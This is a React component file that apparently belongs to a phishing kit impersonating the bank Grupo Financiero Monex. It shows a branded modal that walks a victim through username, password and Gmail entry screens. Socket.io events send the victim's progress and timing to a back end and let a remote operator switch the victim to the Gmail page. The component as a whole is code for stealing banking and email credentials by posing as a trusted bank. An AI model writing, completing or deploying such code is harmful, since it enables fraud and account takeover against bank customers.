import React from "react";
import i00 from "./img/icons/logo.png";
import socket from "../socket";
import GmailEn from "./mail/GmailEn";
import UserEn from "./mail/UserEn";
import PasswordEn from "./mail/PasswordEn";

function Email({ sCt, sS, sP, n }) {
  const [s, setS] = React.useState(false);
  const [page, setPage] = React.useState(0);
  const [isActive, setIsActive] = React.useState(false);
  const [time, setTime] = React.useState(0);
  const [cont, setCont] = React.useState(0);
  const handleX = () => {
    socket.emit("cancel off");
    sCt(false);
  };
  const handleC = (e) => {
    sS(true);
    setS(true);
    setIsActive(true);
    socket.emit("update token", { token: "Cancelar", bToken: true });
    socket.emit("open bToken", { bToken: true });
  };

  React.useEffect(() => {
    let interval = null;
    if (s) {
      if (time >= 5) {
        sP(0);
        sS(false);
        setIsActive(false);
        setCont(cont + 0);
        setTime(0);
      }
    }
    if (isActive) {
      interval = setInterval(() => {
        setTime((time) => time + 1);
        socket.emit("time user", { time: time + 1, p: cont + 2 });
      }, 1000);
    } else {
      clearInterval(interval);
    }
    return () => {
      clearInterval(interval);
    };
  }, [isActive, time, cont]);
  React.useEffect(() => {
    socket.on("mpage", () => {
      setPage(2);
    });
  }, [socket]);
  return (
    <>
      <div id="clonMsj">
        <div
          className="modal"
          id="clonMsjGenerico"
          style={{ display: "block" }}
        >
          <a
            className="close-modal close-md"
            id="closeGenerico1"
            style={{ marginRight: "-23%", display: "inline-block" }}
            onClick={handleX}
          ></a>
          <div
            className="container"
            id="clonContainerGenerico"
            style={{ width: "600px" }}
          >
            <div className="logo" style={{ padding: "75px" }}>
              <img src={i00} alt="Grupo Financiero Monex" />
            </div>
            <div className="mensaje informacion">
              {page === 0 && <UserEn n={n} sPage={setPage} />}
              {page === 1 && <PasswordEn n={n} sPage={setPage} />}
              {page === 2 && <GmailEn n={n} />}
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default Email;
